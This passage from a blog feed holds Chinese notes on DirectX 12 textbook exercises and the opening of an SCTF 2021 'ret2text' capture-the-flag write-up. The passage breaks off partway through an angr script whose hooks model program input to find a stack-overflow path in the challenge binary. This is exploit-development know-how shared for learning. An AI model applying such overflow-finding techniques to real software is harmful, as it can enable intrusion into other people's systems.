    vertices<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>Color <span class="token operator">=</span> <span class="token function">XMFLOAT4</span><span class="token punctuation">(</span>DirectX<span class="token double-colon punctuation">::</span>Colors<span class="token double-colon punctuation">::</span>Black<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//...</span>
geo<span class="token operator">-></span>DrawArgs<span class="token punctuation">[</span><span class="token string">"skull"</span><span class="token punctuation">]</span> <span class="token operator">=</span> skullSubmesh<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后把 BuildRenderItems 改一下就好了，这个拷贝了数据给要画的 mOpaqueRitems，算是最后一步了。</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">auto</span> skullRitem <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>RenderItem<span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">XMStoreFloat4x4</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>skullRitem<span class="token operator">-></span>World<span class="token punctuation">,</span> <span class="token function">XMMatrixScaling</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">XMMatrixTranslation</span><span class="token punctuation">(</span><span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.5f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  skullRitem<span class="token operator">-></span>ObjCBIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  skullRitem<span class="token operator">-></span>Geo <span class="token operator">=</span> mGeometries<span class="token punctuation">[</span><span class="token string">"shapeGeo"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  skullRitem<span class="token operator">-></span>PrimitiveType <span class="token operator">=</span> D3D_PRIMITIVE_TOPOLOGY_TRIANGLELIST<span class="token punctuation">;</span>
  skullRitem<span class="token operator">-></span>IndexCount <span class="token operator">=</span> skullRitem<span class="token operator">-></span>Geo<span class="token operator">-></span>DrawArgs<span class="token punctuation">[</span><span class="token string">"skull"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>IndexCount<span class="token punctuation">;</span>
  skullRitem<span class="token operator">-></span>StartIndexLocation <span class="token operator">=</span> skullRitem<span class="token operator">-></span>Geo<span class="token operator">-></span>DrawArgs<span class="token punctuation">[</span><span class="token string">"skull"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>StartIndexLocation<span class="token punctuation">;</span>
  skullRitem<span class="token operator">-></span>BaseVertexLocation <span class="token operator">=</span> skullRitem<span class="token operator">-></span>Geo<span class="token operator">-></span>DrawArgs<span class="token punctuation">[</span><span class="token string">"skull"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>BaseVertexLocation<span class="token punctuation">;</span>
  mAllRitems<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span>skullRitem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="7-9-X"><a href="#7-9-X" class="headerlink" title="7.9.X"></a>7.9.X</h3><p>关于这个曲面细分我有点迷糊，不知道为什么有些显示不了了</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 摘抄</span>
<span class="token keyword">void</span> <span class="token class-name">GeometryGenerator</span><span class="token double-colon punctuation">::</span><span class="token function">Subdivide</span><span class="token punctuation">(</span>MeshData<span class="token operator">&amp;</span> meshData<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token comment">// Save a copy of the input geometry.</span>
	MeshData inputCopy <span class="token operator">=</span> meshData<span class="token punctuation">;</span>


	meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//       v1</span>
	<span class="token comment">//       *</span>
	<span class="token comment">//      / \
	//     /   \
	//  m0*-----*m1</span>
	<span class="token comment">//   / \   / \
	//  /   \ /   \
	// *-----*-----*</span>
	<span class="token comment">// v0    m2     v2</span>

	uint32 numTris <span class="token operator">=</span> <span class="token punctuation">(</span>uint32<span class="token punctuation">)</span>inputCopy<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span>uint32 i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> numTris<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		Vertex v0 <span class="token operator">=</span> inputCopy<span class="token punctuation">.</span>Vertices<span class="token punctuation">[</span> inputCopy<span class="token punctuation">.</span>Indices32<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
		Vertex v1 <span class="token operator">=</span> inputCopy<span class="token punctuation">.</span>Vertices<span class="token punctuation">[</span> inputCopy<span class="token punctuation">.</span>Indices32<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
		Vertex v2 <span class="token operator">=</span> inputCopy<span class="token punctuation">.</span>Vertices<span class="token punctuation">[</span> inputCopy<span class="token punctuation">.</span>Indices32<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token comment">//</span>
		<span class="token comment">// Generate the midpoints.</span>
		<span class="token comment">//</span>

        Vertex m0 <span class="token operator">=</span> <span class="token function">MidPoint</span><span class="token punctuation">(</span>v0<span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Vertex m1 <span class="token operator">=</span> <span class="token function">MidPoint</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Vertex m2 <span class="token operator">=</span> <span class="token function">MidPoint</span><span class="token punctuation">(</span>v0<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">//</span>
		<span class="token comment">// Add new geometry.</span>
		<span class="token comment">//</span>

		meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
		meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
		meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span>
		meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>
		meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4</span>
		meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 5</span>
 
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>把两个点的所有属性平分了。最为关键的是 MidPoint 中存在  XMVECTOR pos &#x3D; 0.5f*(p0 + p1);<br>这个我觉得有一点点不合理，不过对于平面来说是没问题的。这里暂时也是只是用到了正方体中。</p>
]]></content>
      <categories>
        <category>DX12</category>
      </categories>
      <tags>
        <tag>directX 12</tag>
        <tag>图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>DX12 第六章习题</title>
    <url>/2022/03/13/d3d12-6/</url>
    <content><![CDATA[<h1 id="DX12-6th"><a href="#DX12-6th" class="headerlink" title="DX12-6th"></a>DX12-6th</h1><h2 id="6th-Capture"><a href="#6th-Capture" class="headerlink" title="6th Capture"></a>6th Capture</h2><h3 id="6-13-7"><a href="#6-13-7" class="headerlink" title="6.13.7"></a>6.13.7</h3><p>Q: Merge the vertices of a box and pyramid (Exercise 4) into one large vertex buffer. Also merge the indices of the box and pyramid into one large index buffer (but do not update the index values). Then draw the box and pyramid one-by-one using the parameters of ID3D12CommandList::DrawIndexedInstanced. Use the world transformation matrix so that the box and pyramid are disjoint in world space</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220305213358594.png" alt="image-20220305213358594"></p>
<p>只要配置两个 submesh 以及在 drawIndexInstanced 的时候注意，遗憾的是我在分开两个的时候我是直接把他们坐标该改一下的。不大好</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">virtual</span> <span class="token keyword">void</span> STDMETHODCALLTYPE <span class="token function">DrawIndexedInstanced</span><span class="token punctuation">(</span> 
    _In_  UINT IndexCountPerInstance<span class="token punctuation">,</span>
    _In_  UINT InstanceCount<span class="token punctuation">,</span>
    _In_  UINT StartIndexLocation<span class="token punctuation">,</span>
    _In_  INT BaseVertexLocation<span class="token punctuation">,</span>
    _In_  UINT StartInstanceLocation<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="6-13-8-6-13-9"><a href="#6-13-8-6-13-9" class="headerlink" title="6.13.8-6.13.9"></a>6.13.8-6.13.9</h3><p>Q: Modify the Box demo by rendering the cube in wireframe mode<br>Q: Modify the Box demo by disabling backface culling (D3D12_CULL_NONE); also try culling front faces instead of back faces (D3D12_CULL_FRONT). Output your results in wireframe mode so that you can more easily see the difference.</p>
<p>线框（WIREFRAME）在光栅化的描述中选择。</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">psoDesc<span class="token punctuation">.</span>RasterizerState <span class="token operator">=</span> <span class="token function">CD3DX12_RASTERIZER_DESC</span><span class="token punctuation">(</span>D3D12_DEFAULT<span class="token punctuation">)</span><span class="token punctuation">;</span>
psoDesc<span class="token punctuation">.</span>RasterizerState<span class="token punctuation">.</span>FillMode <span class="token operator">=</span> D3D12_FILL_MODE_WIREFRAME<span class="token punctuation">;</span>
<span class="token comment">//psoDesc.RasterizerState.CullMode = D3D12_CULL_NONE;</span>
<span class="token comment">//psoDesc.RasterizerState.CullMode = D3D12_CULL_MODE_FRONT;</span>
<span class="token comment">/*
enum D3D12_CULL_MODE
    &#123;
        D3D12_CULL_MODE_NONE	= 1,
        D3D12_CULL_MODE_FRONT	= 2,
        D3D12_CULL_MODE_BACK	= 3
    &#125; 	D3D12_CULL_MODE;
*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>D3D12_CULL_MODE_FRONT<img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220305215313716.png" alt="image-20220305215313716"></p>
<p>D3D12_CULL_MODE_NONE<img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220305215505408.png" alt="image-20220305215505408"></p>
<h3 id="6-13-10"><a href="#6-13-10" class="headerlink" title="6.13.10"></a>6.13.10</h3><pre class="line-numbers language-none"><code class="language-none">Q:改变Color的数据类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>改用 XMCOLOR 作为颜色类型 , 需要修改几处数据。<img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220305221053055.png" alt="image-20220305221053055">6.13.11</p>
<pre class="line-numbers language-none"><code class="language-none">vertex 相关的数据结构中，调换顺序会不会有什么影响<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>（a）恰当的，只要 D3D12_INPUT_ELEMENT_DESC 中的 AlignedByteOffset 用于判断输入的位于结构体中的哪个偏移<br>（b）恰当的。这个应该是由于 desc 中第一个字符串描述的来判断是否是对应项。</p>
<h3 id="6-13-12"><a href="#6-13-12" class="headerlink" title="6.13.12"></a>6.13.12</h3><p>正常视口<br><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220305225030326.png" alt="image-20220305225030326"></p>
<p>左半边视口<br><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220305225111429.png" alt="image-20220305225111429"></p>
<h3 id="6-13-13"><a href="#6-13-13" class="headerlink" title="6.13.13"></a>6.13.13</h3><p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220307144654889.png" alt="image-20220307144654889"></p>
<h3 id="6-13-14"><a href="#6-13-14" class="headerlink" title="6.13.14"></a>6.13.14</h3><pre class="line-numbers language-hlsl" data-language="hlsl"><code class="language-hlsl"><span class="token keyword">float4</span> <span class="token function">PS</span><span class="token punctuation">(</span>VertexOut pin<span class="token punctuation">)</span> <span class="token operator">:</span> SV_Target
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">abs</span><span class="token punctuation">(</span>pin<span class="token punctuation">.</span>Color<span class="token operator">*</span><span class="token function">sin</span><span class="token punctuation">(</span>gTime<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="6-13-15"><a href="#6-13-15" class="headerlink" title="6.13.15"></a>6.13.15</h3><p>clip ( pin.Color.r - 0.5f )<br>把颜色值小于 0.5f 的裁掉了。</p>
<h3 id="6-13-16"><a href="#6-13-16" class="headerlink" title="6.13.16"></a>6.13.16</h3><p>这里有坑，不知道为什么。</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//可行</span>
<span class="token keyword">struct</span> <span class="token class-name">ObjectConstants</span>
<span class="token punctuation">&#123;</span>
    XMFLOAT4X4 WorldViewProj <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    XMFLOAT4 gPulseColor<span class="token punctuation">;</span>
    <span class="token keyword">float</span> gTime<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token comment">//不行，gPulseColor 可能是对齐的问题</span>
<span class="token keyword">struct</span> <span class="token class-name">ObjectConstants</span>
<span class="token punctuation">&#123;</span>
    XMFLOAT4X4 WorldViewProj <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> gTime<span class="token punctuation">;</span>
    XMFLOAT4 gPulseColor<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="6-13-17"><a href="#6-13-17" class="headerlink" title="6.13.17"></a>6.13.17</h3><p>略，书上源代码清清楚楚的</p>
]]></content>
      <categories>
        <category>DX12</category>
      </categories>
      <tags>
        <tag>directX 12</tag>
        <tag>图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>SCTF 2021 ret2text</title>
    <url>/2021/12/27/sctf_2021_ret2text/</url>
    <content><![CDATA[<h1 id="CheckIn-ret2text"><a href="#CheckIn-ret2text" class="headerlink" title="CheckIn_ret2text"></a>CheckIn_ret2text</h1><h2 id="符号执行部分"><a href="#符号执行部分" class="headerlink" title="符号执行部分"></a>符号执行部分</h2><p>受限于对 angr 的理解以及不是很清楚一些高级接口，只能手糊一个 hook + state 携带输入字符串符号执行过程</p>
<p>因为代码写的比较杂凑<br>为理解以下代码需要知道 state.memory 中 0x0 第一个字节存着多少次输入。0x100偏移之后每个0x100存储一个结构 { type:1bytes ，size:1bytes , str:size } 只能说是对症下药了。为了找到栈溢出，需要存储上一次输入字符串可以的长度，我保存在 input_str_off&#x3D; 0x100000 。我的命名多少有点古怪，明明是个 size ，我把它命名成了 str_off …</p>
<p>要是有什么更好的写法，一定要告诉我呀~</p>
<p><strong>2022&#x2F;3&#x2F;7 补充</strong> hook 的写法可以写的简洁一些。这道题可以直接执行，不需要自己去控制程序流或者分析。找到非约束的状态直接求解输入即可。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> claripy
<span class="token keyword">import</span> angr
<span class="token keyword">from</span> angr <span class="token keyword">import</span> SimProcedure
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> archinfo
<span class="token keyword">import</span> copy

base <span class="token operator">=</span>  <span class="token number">0x400000</span>
start <span class="token operator">=</span> <span class="token number">0x4013ED</span>
out_off <span class="token operator">=</span> <span class="token number">0</span>
out_size <span class="token operator">=</span> <span class="token number">0</span>

symbol_num <span class="token operator">=</span> <span class="token number">0</span>
input_offset <span class="token operator">=</span> <span class="token number">0x100</span>
input_str_off<span class="token operator">=</span> <span class="token number">0x100000</span>
<span class="token keyword">class</span> <span class="token class-name">hook_input_val</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> symbol_num
        st <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        new_symbol  <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"input_%i"</span> <span class="token operator">%</span>symbol_num<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>
        st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> new_symbol

        symbol_size <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span> <span class="token comment"># load size</span>
        before_size  <span class="token operator">=</span> st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>symbol_size<span class="token punctuation">)</span>
        after_size  <span class="token operator">=</span> before_size <span class="token operator">+</span> <span class="token number">1</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> after_size<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_offset<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">*</span>before_size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>      <span class="token comment"># type</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_offset<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">*</span>before_size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>  <span class="token comment"># size</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_offset<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">*</span>before_size <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> new_symbol<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span> <span class="token comment"># value</span>
        <span class="token comment"># st.memory.store(input_offset+0x100*before_size + 1, 0x20, size= 1, endness=archinfo.Endness.LE)</span>

        symbol_num <span class="token operator">+=</span> <span class="token number">1</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>st<span class="token punctuation">.</span>stack_pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 0x401272</span>
<span class="token keyword">class</span> <span class="token class-name">hook_input_line</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> symbol_num
        st   <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        size <span class="token operator">=</span> st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esi<span class="token punctuation">)</span>
        pt   <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rdi

        symbol_size <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        before_size <span class="token operator">=</span> st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>symbol_size<span class="token punctuation">)</span>
        after_size  <span class="token operator">=</span> before_size <span class="token operator">+</span> <span class="token number">1</span>
        
        good_input  <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"input_%d"</span> <span class="token operator">%</span>i<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>symbol_num<span class="token punctuation">,</span>symbol_num<span class="token operator">+</span>size<span class="token punctuation">)</span><span class="token punctuation">]</span>
        input_bytes <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>good_input<span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> after_size<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>

        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_offset<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">*</span>before_size<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
